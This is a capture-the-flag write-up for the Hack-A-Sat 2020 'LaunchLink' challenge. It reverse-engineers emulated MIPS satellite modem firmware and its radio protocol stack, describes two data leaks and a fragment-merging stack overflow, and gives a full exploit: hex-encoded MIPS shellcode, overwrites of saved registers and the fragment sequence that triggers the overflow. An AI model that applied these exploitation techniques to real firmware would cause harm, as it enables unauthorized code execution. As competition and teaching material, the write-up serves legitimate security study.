# SPACE SECURITY CHALLENGE 2020 HACK-A-SAT: LaunchLink

**Category:** Payload Modules
**Points:** 436
**Solves:** 1
**Description:**

> Satellite Internet brought to you by Launchdotcom, first generation prototype, ahead of its time. We've managed to download an early prototype of their payload module. Our team of reverse engineers have analyzed the prototype and developed a suitable emulator for executing the binary firmware extracted from the device. We've included the Emulator and Reverse Engineering notes from our analysis.
>
> [rfmagic.zip](https://static.2020.hackasat.com/a299718316110835071bf653c04cc9dfbd5dfb09/rfmagic.zip)
>
> Connect to the challenge on launchlink.satellitesabove.me:5065

## Write-up

_Write-up by Solar Wine team_

The provided ZIP archive contained 3 files: `challenge.rom`, `notes.txt` and `vmips`.

`notes.txt` contained:

> Our team managed to download off an open FTP server from LaunchDotCom's website and found some interesting documents about their upcoming Satellte Internet service. We've figured out how to communicate over the RF link but we need your help to figure out how to exploit the baseband processor on the satellite.
>
> We've managed to download the firmware for the baseband processor of the payload module from the open FTP server.
>
> It appears they graciously left an emulator on their public FTP server for debugging their platform, we have provided that as well. Our team has determined that the target system uses 2MB of RAM and to run the emulator use the following command line:
>
> vmips -o memsize=2097152 firmware.bin
>
> Our team would like to access sensitive data located 0xa2008000 on the running system.
>
> Good Luck!

`vmips` appeared to be an emulator.
Its help text was:
```text
$ ./vmips --help
Usage: vmips [OPTION]... [ROM-FILE]
Start the vmips virtual machine, using the ROM-FILE as the boot ROM.

  -o OPTION                  behave as if OPTION were specified in .vmipsrc
                               (see manual for details)
  -F FILE                    read options from FILE instead of .vmipsrc
  -n                         do not read the system-wide configuration file
  --version                  display version information and exit
  --help                     display this help message and exit
  --print-config             display compile-time variables and exit

By default, `romfile.rom' is used if no ROM-FILE is specified.

Report bugs to <vmips@dgate.org>.
```

The email address helped finding official websites of the vmips project: http://www.dgate.org/vmips/index.shtml and http://vmips.sourceforge.net/.
`vmips` was an emulator for MIPS R3000 processor.

When running the given command, some information was given:
```text
$ ./vmips -o memsize=2097152 challenge.rom
Little-Endian host processor detected.
Mapping ROM image (challenge.rom, 10019 words) to physical address 0x1fc00000
Mapping RAM module (host=0x6bc20a387010, 2048KB) to physical address 0x0
Mapping Timer device to physical address 0x01010000
Connected IRQ7 to the Timer device
Mapping Flag Device to physical address 0x02008000
Mapping Synova UART to physical address 0x02000000
Connected IRQ3 to the Synova UART
Mapping Synova UART to physical address 0x02000010
Connected IRQ4 to the Synova UART
Connected IRQ5 to the Synova UART
Hit Ctrl-\ to halt machine, Ctrl-_ for a debug prompt.

*************RESET*************
```

The first line stated that the processor was Little Endian.
This was confirmed by [`cpu_rec`](https://github.com/airbus-seclab/cpu_rec), that detected that the ROM file contained MIPSel code.

This also gave the physical address of the ROM, the RAM and several devices:

* Physical address `0x00000000...0x001fffff`: RAM (2 MB)
* Physical address `0x01010000`: Timer device
* Physical address `0x02000000`: Synova UART device
* Physical address `0x02000010`: Synova UART device
* Physical address `0x02008000`: Flag device
* Physical address `0x1fc00000...0x1fc09c8b`: ROM (40076 bytes from `challenge.rom`)

"Flag Device" and "Synova UART" were not present in the public source code of vmips 1.5.1 (this was the right version, according to `./vmips --version`).
Nevertheless, `notes.txt` gave a clear objective: "access sensitive data located `0xa2008000` on the running system."
What was this address?
In 32-bit MIPS architecture, the virtual address space of the memory was divided in segments:
```text
kuseg: virt 0x00000000...0x7fffffff user     mapped   cacheable
kseg0: virt 0x80000000...0x9fffffff kernel unmapped   cacheable
kseg1: virt 0xa0000000...0xbfffffff kernel unmapped uncacheable
kseg2: virt 0xc0000000...0xdfffffff Kernel   mapped   cacheable
kseg3: virt 0xe0000000.. 0xffffffff Kernel   mapped   cacheable
```

`kseg0` and `kseg1` both always mapped the first 512 MB of the physical address space.
Therefore `0xa2008000` was the uncacheable mapping of physical address `0x02008000`, which was the flag device.

The objective of this challenge consisted in finding a way to read the content of the data stored in this device.


## First steps in the MIPS ROM

The ROM (file `challenge.rom`) started with a jump to some code located at offset `0x400`.
This code reset all registers, set the stack pointer (`sp`) to `0xa00ffffc`, configured the TLB (Translation Look aside Buffer) and copied some data from `0xbfc08ef8...0xbfc09c8b` to `0xa0180000`.
In 32-bit MIPS, the range `0xa0000000...0xbfffffff` of the virtual address space mapped the beginning of the physical address space.
This therefore gave the mapping of the virtual address space that used the ROM:
```text
0xa0000000...0xa01fffff: RAM (2MB)
  0xa0000000...0xa00fffff: stack (sp initialized to the end of this zone)
  0xa0100000...0xa017ffff: heap (the top of heap pointer, at 0xa0180070, is initialized to 0xa0100000)
  0xa0180000...0xa0180d93: initialized data, from challenge.rom[0x8ef8:0x9c8c]
  0xa0180d94...0xa01fffff: uninitialized data (".bss")
0xa1010000             : Timer device
0xa2000000             : Synova UART device
0xa2000010             : Synova UART device
0xa2008000             : Flag device
0xbfc00000...0xbfc09c8b: ROM (challenge.rom)
```

The entrypoint (located at virtual address `0xbfc00400`) then called a function at `0xbfc08de0` that initialized some structures and called 3 functions in an infinite loop.
We called this function `main`.
Each of these 3 functions started by calling logging function, that we renamed `DBG_printf`:

* Function `0xbfc085ec`: `DBG_printf(4,"MAC::Process\n");`
* Function `0xbfc015e0`: `DBG_printf(4,"RLL::Radio Link Layer Process (UL/DL processing)\n");`
* Function `0xbfc02b9c`: `DBG_printf(4,"RLL::Radio Resource Layer Process (UL/DL processing)\n");` (there was actually a typo here: should be `RRL` in the message, as all other messages of the function used `RRL`).

`DBG_printf` was a function that could be understood as the following pseudo-code:
```c
int DBG_printf(int level, const char *fmt, ...) {
    char buffer[1024];
    if (!(level & g_debuglevel_at_0xa0180050))
        return 0;
    vsprintf(buffer, fmt, &va_args);
    UART1_printf("DEBUG::%s\n", buffer); // Write to HW register 0xa200000c
}
```

The global variable `g_debuglevel_at_0xa0180050` was set to 0 via a call to function `0xbfc01840` in `main`.
By patching `challenge.rom` in order to set this variable to 7 (because all calls to `DBG_printf` used 1, 2 or 4 as first parameter).
Then we ran `vmips` with the patched ROM and saw many more messages:
```text
# At bfc08e10, change 25200000 (or a0,zero,zero) to ff000434 (ori a0,zero,0xff)
$ xxd challenge.rom | sed 's/\(08e10:\) 2520 0000/\1 ff00 0434/' | \
    xxd -r > challenge.dbg.rom
$ ./vmips -o memsize=2097152 challenge.dbg.rom
[...]
DEBUG::MAC::Process

DEBUG::CMac::SendRLLDataBlockSizeUpdate::newDataBlockSize=29

DEBUG::RLL::Radio Link Layer Process (UL/DL processing)

DEBUG::RLL::UL MAC PDU

DEBUG::PDUPOOL::Init (size=65536) (items=1365) (10,20)
DEBUG::RLL::Radio Resource Layer Process (UL/DL processing)

DEBUG::MAC::Process

DEBUG::RLL::Radio Link Layer Process (UL/DL processing)

DEBUG::RLL::Radio Resource Layer Process (UL/DL processing)

DEBUG::MAC::Process
```

## Radio layers in the ROM

Back to `main`, there were 3 functions called in a loop.
Each of these functions used a structure allocated on `main`'s stack which was initialized using several parameters.
Among these parameters, there were shared structures, that appeared to behave as a way to transmit messages from a function to another.
We called these shared structures *channels*, which were basically FIFO (First-In First-Out) pipes of messages, using a linked list to store their contents.
These channels were initialized with names: `"UL: MACRLL"`, `"UL: RLLRRL"`, `"DL: RRLRLL"`, `"DL: RLLMAC"` and `GLOBAL`.

These names and some understanding of the 3 functions made us draw the following diagram:
```text
RRL (Radio Resource Layer)
  ^       |
  | UL    | DL
  |       v
RLL (Radio Link Layer)
  ^       |
  | UL    | DL
  |       v
MAC (Medium Access Control)
```

In this diagram, it is clear that `UL` means Uplink and `DL` Downlink.
The `GLOBAL` channel appeared not to be used.

Where did the data come from/go to under the MAC layer?
Reading functions led to the interrupt handler located at address `0xbfc00180`.
This handler read data from the 32-bit hardware register `0xa2000014` into a ring buffer used by the MAC processing function to receive `UL` packets.
This function used another ring buffer to send `DL` packets, which is read by the same interrupt handler to transmit packets in chunks of 32 bits in hardware register `0xa200001c`.
Reading the memory map of the virtual address space again, it appeared that the physical layer used by the MAC layer was the second Synova UART device.

So, the firmware parsed packets coming from a UART device and replied to it.
What did each layer do?
As each function handling a layer were quite large, we wrote a list of packets as we found them while reversing the binary.

### MAC layer processing

When a *data block size update* occurred, call function `MAC_SendRLLDataBlockSizeUpdate(newDataBlockSize=MAC_size-3)`:

* `DBG_printf(4,"CMac::SendRLLDataBlockSizeUpdate::newDataBlockSize=%u\n",newDataBlockSize)`
* send to RLL: `31 [u32 timeDeltaUL] [u8 newDataBlockSize]`

When data from the physical layer has been received (input from the 2nd Synova UART device):

* `E3 [u16 CRC] [data]`: (`"MAC::UL DATA_BLOCK"`) check the CRC-16 of the data and send to RLL: `37 [u32 timeDeltaUL] [data]`
* `79 [u16 CRC] [data: u8 size]`: (`"MAC::UL UPDATE_BLOCK_SIZE"`) check the CRC-16 of the data, which is one byte, check that `0x10 <= size <= 0xc0`, check that `size` is a multiple of 4, update the block size and send to RLL an update with `MAC_SendRLLDataBlockSizeUpdate(size - 3)`
* `13` : reset the MAC block size to `0x20` and send to RLL an update with `MAC_SendRLLDataBlockSizeUpdate(0x20 - 3)`
* other: `DBG_printf(2,"MAC::UL UNKNOWN MAC PDU TYPE [%x].\n")`

When a DL PDU (Protocol Data Unit) has been received from RLL:

* `9C [u32 timeDeltaDL] [data]`: forwards `data` into a packet sent through the physical layer as: `E3 [u16 CRC] [data]`
* `4D [u32 timeDeltaDL]`: (heart beat) update the last received `timeDeltaDL`

Once every 20 iterations, send heart beat to RLL: `4A [u32 timeDeltaUL]`

`timeDeltaUL` and `timeDeltaUL` were timers between MAC and RLL layers used to watch for long delays between internal heart beats.


### Radio Link Layer (RLL) processing

When a UL PDU has been received from MAC:

* `31 [u32 timeDeltaUL] [u8 blocksize]`: update the block size from MAC, reset the "PDU POOL" and `DBG_printf(4,"PDUPOOL::Init (size=%d) (items=%d) (%x,%x)",0x10000,items,0x10,new_block_size);`
* `4A [u32 timeDeltaUL]`: (heart beat) update the last received `timeDeltaUL`
* `37 [u32 timeDeltaUL] 73 [data]`: (`"RLL::UL DEDICATED_MESSAGE"`)
    * ensure that the size of `data` matches the current MAC block size
    * check that security was enabled
    * decrypt `[data]` with a key that was present in the RLL context structure
    * handle fragmentation:
        * the decrypted data starts with 16 bits, called here `u16 pktword`
        * `fragidx = pktword & 0xf` is the fragment index in the fragmented packet (maximum 16 fragments/packet)
        * `seqnum = (pktword >> 4) & 0x7ff` is the sequence number of the fragmented packet, at most `0x11` different from the last one
        * `is_last = (pktword >> 15) & 1` is a bit that indicates the last packet of the fragmentation
    * decrypted packets are stored in the PDU POOL
    * once all fragments of a packet are received, the merged data is send to RRL as: `73 [merged fragments]`
* `37 [u32 timeDeltaUL] C3 [data]` (`"RLL::UL FAST_MESSAGE"`)
    * ensure that the size of `data` matches the current MAC block size
    * check that security was enabled
    * decrypt `[data]` with a key that was present in the RLL context structure
    * send to RRL: `C3 [decrypted data]`
* `37 [u32 timeDeltaUL] 17 [data]` (`"RLL::UL BROADCAST MESSAGE"`): send to RRL: `17 [data]`

When a DL PDU has been received from RRL:

* `73 [data]`: (`"RLL::DL DEDICATED_MESSAGE"`) cut the data into fragments of the block size defined by the MAC layer, encrypt each fragment, add 16-bit fragment headers and send to MAC each fragment: `9C [u32 timeDeltaDL] 73 [fragment]`
* `C3 [data]`: (`"RLL::DL FAST_MESSAGE"`) encrypt the data to send to MAC: `9C [u32 timeDeltaDL] C3 [encrypted data]`
* `D2 [key: 16 bytes] [IV for UL decryption: 8 bytes] [IV for DL decryption: 8 bytes]`: initialize en encryption context with the given parameters
* `17 [data]`: send to MAC: `9C [u32 timeDeltaDL] 17 [data]`

Once every 240 iterations, send heart beat to MAC: `4D [u32 timeDeltaDL]`

If there was not heart beat from MAC in `30000001` cycles, `DBG_printf(4,"RLL timeout!\n");`


### Radio Resource Layer (RRL) processing

When a UL PDU has been received from RLL:

* `C3 01 [u32 handle] [u8 size] [data with size]`: find a node from its `handle` and add the data to it. Every node may contain at most 0x200 bytes
    * reply with `C3 17 77` if the packet is too small
    * reply with `C3 17 33` if the `handle` does not exist
    * reply with `C3 01 [u32 handle] [u8 size]` if the add succeeded
* `C3 02 [u32 handle] [u8 size]`: find a node from its `handle` and read the data that was previously added to it
    * reply with `C3 17 77` if the packet is too small
    * reply with `C3 17 33` if the `handle` does not exist
    * reply with `C3 02 [u32 handle] [u8 size] [data]` if the read succeeded
* `17 7x [0x60 bytes]`: initialize a security context
    * get `0x60` bytes from the internal PRNG (using repeated `PRNG_get_u64() & 0xff`)
    * send these bytes to RLL: `17 9D [0x60 random bytes]`
    * prepare a hardcoded key `{0xa5b5c5d5, 0x12345678, 0x41414141, 0xcccccccc}`
    * encrypt the `0x60` bytes received with this key in ECB mode
    * encrypt the `0x60` random bytes received with the same key, in ECB mode
    * XOR both encrypted results together into a 96-byte "shared secret"
    * `DBG_printf(4,"RRL::UL SHARED SECRET[%x%x%x%x)", shared_secret[0]...);`
    * compute `master key = md5(shared_secret[0:0x30])` (16 bytes)
    * compute `(UL IV, DL IV) = md5(shared_secret[0x30:0x60])` (2 times 8 bytes)
    * `DBG_printf(4,"RRL::UL Negotiated security parameters MASTER KEY[%x%x%x%x] UL IV(%x%x) DL IV(%x%x)", ...)`
    * send to RLL: `D2 [master key: 16 bytes] [UL IV: 8 bytes] [DL IV: 8 bytes]`
* `73 52 [u32 handle]`:
    * find a node from its `handle`
    * reply with `73 28 01` if the packet is too small
    * reply with `73 28 02` if the `handle` does not exist
    * compute `sprintf("%s: %d %d %d", node->name /* max 0x100 bytes */, node->handle, node->field_0x94, node->field_0x95)`
    * send to RLL: `73 28 00 [u8 string length] [string]`
* `73 71 [u16 size] [data]`: (echo) copy the data in a message sent to RLL: `73 E2 [u16 size] [data]`
* `73 87 [u32 handle]`: find a node from its `handle` and destroy it.
    * reply with `73 94 00` if successful, or `73 94 01` if an error occurred
* `73 23 [u8 field_0x94] [u8 field_0x95] [signed_i8 namesize] [string name]`: (`"RRL:: AP SETUP REQUEST"`)
    * create a new node associated with the given name and a data buffer of 512 bytes
    * reply with `73 5E 00 [u32 handle]` if this succeeded
    * reply with `73 5E 01` if a length is not valid
    * reply with `73 5E 02 [u32 handle]` if the name was already associated with another handle
    * reply with `73 5E 03 [u32 nodes_number]` if there were already 8 nodes (`DBG_printf(4,"RRL:: AP SETUP REQUEST MAX ACCESS POINTS REACHED")`)
* `73 3F [u16 size] [u32 handle] [u16 offset]`:
    * find a node from its `handle` and compute the CRC-32 of the data
    * reply with `73 AA 8F [u32 handle] [u32 crc]` if this succeeded
    * reply with `73 AA CC` if the packet is too small
    * reply with `73 AA 33` if the `handle` does not exist
    * reply with `73 AA 5D` if there is an issue with the offsets

## Cryptography

From a high-level perspective:

* RRL was about managing data (nodes) associated with names, in a confidential way by first negotiating a shared secret
* RLL was about to handle the encryption and fragmentation of RRL messages
* MAC was about to handle sending and receiving data to/from the physical layer, ensuring integrity using CRC-16.

In order to interact with the remote device, we needed to reimplement this protocol, with fragmentation and encryption.

But first, the CRC-16 used by the MAC layer needed to be implemented:
```py
def MAC_crc16(data):
    value = 0xffff
    for byte in data:
        for _ in range(8):
            value = (value >> 1) ^ (0x8408 if (byte ^ value) & 1 else 0)
            byte >>= 1
    return value ^ 0xffff
```

Then a security context needed to be initialized, by sending `17 70...` to RRL.
This packet was encapsulated in a MAC packet `E3 [u16 CRC] 17 70...`.

This resulted in the patched firmware displaying:
```text
DEBUG::RRL::UL SHARED SECRET[73352259CDD6103744C33520C75DAB88)
DEBUG::RRL::UL Negotiated security parameters MASTER KEY
[3F4D621CCDD8DA7AF0E31524AE98888] UL IV(A3BA275820BEAFB) DL IV(265BD104B90DAB8B)
```

Unfortunately this output could be used directory to get the key IV, because the hexadecimal numbers were formatted without any leading zero.
After implementing the key exchange algorithm, which used a patched XTEA encryption algorithm:
```py
def XTEA_crypt(block, key):
    v0, v1 = struct.unpack('<II', block)
    i_sum = 0x3e778b90
    for _ in range(16):
        v0 = (v0 + ((((v1 << 4) ^ (v1 >> 5)) + v1) ^ (i_sum + key[i_sum & 3]))) & 0xffffffff
        i_sum = (i_sum + 0x83e778b9) & 0xffffffff
        v1 = (v1 + ((((v0 << 4) ^ (v0 >> 5)) + v0) ^ (i_sum + key[(i_sum >> 11) & 3]))) & 0xffffffff
    return struct.pack('<II', v0, v1)
```
The encryption parameters were:

* Master key `(0x03f4d621, 0xccdd8da7, 0xaf0e3152, 0x4ae98888)`
* UL IV `(0xa3ba2758, 0x020beafb)`
* DL IV `(0x265bd104, 0xb90dab8b)`

As the device shared secret was derived from a deterministic PRNG (Pseudo-Random Number Generator), the server secret was always the same and these parameters are those obtained with a client secret full of zeros.

Once this was achieved, we implemented the full protocol as functions in `client.py`.


## Vulnerabilities

3 vulnerabilities were identified in the firmware.

When computing the CRC32 of the data of a node, the firmware does:
```c
    if (write_offset < offset_start + size) {
        local_28._0_2_ = 0x5daa;
        pack_u32(local_28 + 2,handle);
        RRL_send_73_packet(ctx,local_28,6); // Send error packet 73 AA 5D
        // ... but continue execution!
    }
    checksum = compute_crc32(&node->ringbuffer,offset_start,size);
    local_28._0_2_ = 0x8faa;
    pack_u32(local_28 + 2,handle);
    pack_u32(local_28 + 6,checksum);
    RRL_send_73_packet(ctx,local_28,10);
```

This means that after writing some data in a node, it is possible to query checksums of few bytes after the data.
This is a first data leak.

There is another data leak in the "echo" function: when sending `73 71 [u16 size] [data]`, the firmware prepares the reply `73 E2 [u16 size] [data]` with:
```c
    size = unpack_u16(packet + 2);
    reply_data = malloc(size + 3);
    *reply_data = 0xe2;
    pack_u16(reply_data + 1, size);
    memcpy(reply_data + 3, packet + 4, size); // out-of-bound read
    RRL_send_73_packet(ctx, reply_data, size + 3)
```

The `size` parameter was not checked, so `memcpy` could read past the end of the packet, if the parameter `size` is large enough.
This leads to leaking bytes from the heap.

The third and more important vulnerability is a stack buffer overflow when merging packet fragments.
The function that handled "RLL UL DEDICATED MESSAGE" (at `0xbfc00604`) used:
```c
    byte abStack1328[0x500]; unsigned int segment_size;
    /* ... */
    if (has_received_all_fragments(PDU_entry)) {
        success = merge_fragments_into_buffer(
            PDU_entry, abStack1328, 0x500, &segment_size);
        if (success) {
            buffer = malloc(segment_size + 1);
            *buffer = opcode;
            memcpy(buffer + 1, abStack1328, segment_size);
            /* ... */
        }
```

Function `merge_fragments_into_buffer` (at `0xbfc04414`) computed the complete size of the fragmented packet, verified that it fitted into the buffer, and they copied the fragments into it.
But the logic of the size verification and the copy were different: the size verification only considered fragments whose index was less or equal the index of the last fragment, while the copy considered all fragments, even the ones whose index were greater than the index of the fragment marked "last".

This allowed overflowing into a 1280-byte stack buffer, with fragments which lengths are constrained by the block size of the MAC layer.

This primitive was enough to build a ROP chain that would lead to arbitrary code execution on the device.
The exploitation was quite straightforward because:

* we could write the payload in MIPSel machine code in the name field of a node, as the whole memory was executable,
* and so no stack pivot was needed
* heap allocations were deterministic (so no leak was needed)
* the stack pointer was known (so it was possible to recover nicely from the overflow by jumping to some place with the right stack pointer)

When the vulnerable code path was reached, here was what contained the stack:
```text
0xa00ffffc  ------- stack top (initial SP), call main(at bfc08de0)
                    frame of main (addiu sp,sp,-0x1318)
0xa00fff5c  RRL_ctx (at sp+0x1278)
0xa00ffee4  RLL_ctx (at sp⁺0x1200)
0xa00ffd14  MAC_ctx (at sp+0x1030)
0xa00fece4
            ------- call RLL_process(at 0xbfc015e0)
                    frame of RLL_process (addiu sp,sp,-0x20)
0xa00fecc4
            ------- call RLL_process_from_MAC(at 0xbfc01454)
            ------- tail-call RLL_process_73_UL_DEDICATED_MESSAGE (at 0xbfc00bbc)
            ------- tail-call RLL_process_73_decrypted_fragment (at 0xbfc00604)
0xa00fecc0  saved ra
0xa00fecbc  saved s8
0xa00fecb8  saved s7
0xa00fecb4  saved s6
0xa00fecb0  saved s5
0xa00fecac  saved s4
0xa00feca8  saved s3
0xa00feca4  saved s2
0xa00feca0  saved s1
0xa00fec9c  saved s0
0xa00fec98
0xa00fec94  segment_size (pointer given as parameter)
0xa00fec90  abStack1328[0x4fc...0x4ff]
...         ... (0x500 bytes of stack buffer)
0xa00fe794  abStack1328[0..3]
...
0xa00fe77c          frame of RLL_process_73_decrypted_fragment (addiu sp,sp,-0x548)
```

At the end of the vulnerable function, many saved registers (`s0` to `s8`) were restored from the stack, as well as the return address.
This allowed jumping anywhere, including on the stack where we controlled `0x500` = 1280 bytes.

But this also meant that the stack was quite corrupted after the execution of the payload.
To recover from this, all that was needed was to jump to the main loop (at `0xbfc08ed8`) with the right stack pointer `0xa00fece4`.
We used the following code to recover the stack:
```py
shellcode += bytes.fromhex("0fa01d3c")  # lui sp,0xa00f
shellcode += bytes.fromhex("e4ecbd37")  # ori sp,sp,0xece4
shellcode += bytes.fromhex("c0bf103c")  # lui s0,0xbfc0
shellcode += bytes.fromhex("d88e1036")  # ori s0,s0,0x8ed8
shellcode += bytes.fromhex("08000002")  # jr s0
shellcode += bytes.fromhex("00000000")  # nop
```

We needed to quickly check what nothing was missed.
To do this, several options were possible:

* enabling the debug logs in the original firmware, by calling the function that set it
* displaying the content of the flag device on the debug log

Sending the flag as a packet was tried but did not work well enough, so instead the buffer of a node was modifier to target the flag, and the flag was read back.

The exploit was then:
```py
# Make space in order not to overwrite the shellcode on the stack when calling functions
shellcode = bytes.fromhex("e8ecbd27")  # addiu sp,sp,-0x1318

# Enable debug log
shellcode += bytes.fromhex("c0bf023c")  # lui v0,0xbfc0
shellcode += bytes.fromhex("40184234")  # ori v0,v0,0x1840
shellcode += bytes.fromhex("09f84000")  # jalr v0 = 0xbfc01840 ; set_log_level(0xff)
shellcode += bytes.fromhex("ff000434")  # _ori a0,zero,0xff  (with delay slot)

# Print the flag: DBG_printf(0xff, 0xbfc09310="DEBUG::%s\n", s2=flag)
shellcode += bytes.fromhex("c0bf053c")  # lui a1,0xbfc0
shellcode += bytes.fromhex("1093a534")  # ori a1,a1,0x9310
shellcode += bytes.fromhex("25304002")  # or a2,s2,zero
shellcode += bytes.fromhex("09f8e002")  # jalr s7
shellcode += bytes.fromhex("ff000434")  # _ori a0,zero,0xff

# Find the node by handle: RRL_find_node_by_handle(RRL_ctx=0xa00fff5c, s0=handle)
shellcode += bytes.fromhex("0fa0043c")  # lui a0,0xa00f
shellcode += bytes.fromhex("5cff8434")  # ori a0,a0,0xff5c
shellcode += bytes.fromhex("25280002")  # or a1,s0,zero
shellcode += bytes.fromhex("c0bf023c")  # lui v0,0xbfc0
shellcode += bytes.fromhex("b4204234")  # ori v0,v0,0x20b4
shellcode += bytes.fromhex("09f84000")  # jalr v0 = 0xbfc020b4 = RRL_find_node_in_own_list_by_handle
shellcode += bytes.fromhex("00000000")  # nop

# Modify the buffer pointer of the node, at AP context + 0x98 + 0x10 = v0 + 0xa8
shellcode += bytes.fromhex("a80052ac")  # sw s2,0xa8(v0)

# Debug: print handle (A0111120 in real firmware, A0111158 with debug enabled)
shellcode += bytes.fromhex("ff000434")  # ori a0,zero,0xff
shellcode += bytes.fromhex("25286002")  # or a1,s3,zero ; "RRL::UL SHARED SECRET[%x%x%x%x)"
shellcode += bytes.fromhex("25304000")  # or a2,v0,zero
shellcode += bytes.fromhex("00000734")  # ori a3,zero,0x0
shellcode += bytes.fromhex("00000834")  # ori a4,zero,0x0
shellcode += bytes.fromhex("09f8e002")  # jalr s7         ; printf
shellcode += bytes.fromhex("00000000")  # nop

# Recover code execution: sp = 0xa00fece4, pc = 0xbfc08ed8
shellcode += bytes.fromhex("0fa01d3c")  # lui sp,0xa00f
shellcode += bytes.fromhex("e4ecbd37")  # ori sp,sp,0xece4
shellcode += bytes.fromhex("c0bf023c")  # lui v0,0xbfc0
shellcode += bytes.fromhex("d88e4234")  # ori v0,v0,0x8ed8
shellcode += bytes.fromhex("08004000")  # jr v0
shellcode += bytes.fromhex("00000000")  # nop

# Create a node for the flag
handle = AP_create(1, 2, b'NodeName')
write_to_ap(handle, b'@' * 0x80)  # Fill garbage, to be able to read the flag

MAC_set_blksize(0x89)  # set newDataBlockSize=189 (315 fragments)

# Fill a buffer of 1280 = 0x500 bytes with a mirror command
payload = struct.pack('<BH', 0x71, 100) + b'xxxxx' + shellcode
payload += b'P' * (0x500 - len(payload))

# Saved variables on the stack, that are restored
payload += struct.pack(
    '<IIIIIIIIIIII',
    0xff, 0,
    handle,      # s0 = handle
    0,           # s1
    0xa2008000,  # s2 = flag
    0xbfc0981c,  # s3 = "RRL::UL SHARED SECRET[%x%x%x%x)"
    0,           # s4
    0,           # s5
    0,           # s6
    0xbfc017e0,  # s7 = DBG_printf
    0,           # s8
    0xa00fe794 + 8,  # ra, to run payload from the stack
)
frag_size = current_mac_block_size - 3
print("Sending {0}={0:#x} bytes in {1} fragments of {2}={2:#x} bytes".format(
    len(payload), (len(payload) + frag_size - 1) // frag_size, frag_size))
assert len(payload) < 0xf * frag_size

# Send first fragment to tell "hey, this is fragmented"
RLL_send_UL_dedicated_fragment(last_UL_dedicated_sequence, 0, 0, payload[:frag_size])
# Send more fragments from the 3rd one
for idx in range(2, (len(payload) + frag_size - 1)//frag_size):
    RLL_send_UL_dedicated_fragment(last_UL_dedicated_sequence, 0, idx, payload[frag_size*idx:frag_size*(idx+1)])

# Send the 2nd fragment with "is_last" bit set
RLL_send_UL_dedicated_fragment(last_UL_dedicated_sequence, 1, 1, payload[frag_size:frag_size*2])
last_UL_dedicated_sequence += 1

# Reset MAC layer to clean the PDU POOL
MAC_set_blksize(0xbd)
response = RLL_recv_DL_dedicated()

# Read the flag
read_from_ap(handle, 0x80)
```

This displayed the flag, as expected:
```text
[AP] Data @0xef2c9fd1=4012679121: [128] b'flag{echo43208echo:
GP9a-DHrK23lk6OGomguRyu-aLi3RnZODemJu4x2-QZbhWvcRFkW0l5hTszuEyltCMm-zvHEUQN8MZHqYOH7ls0
}\x00\x00\x00...
```
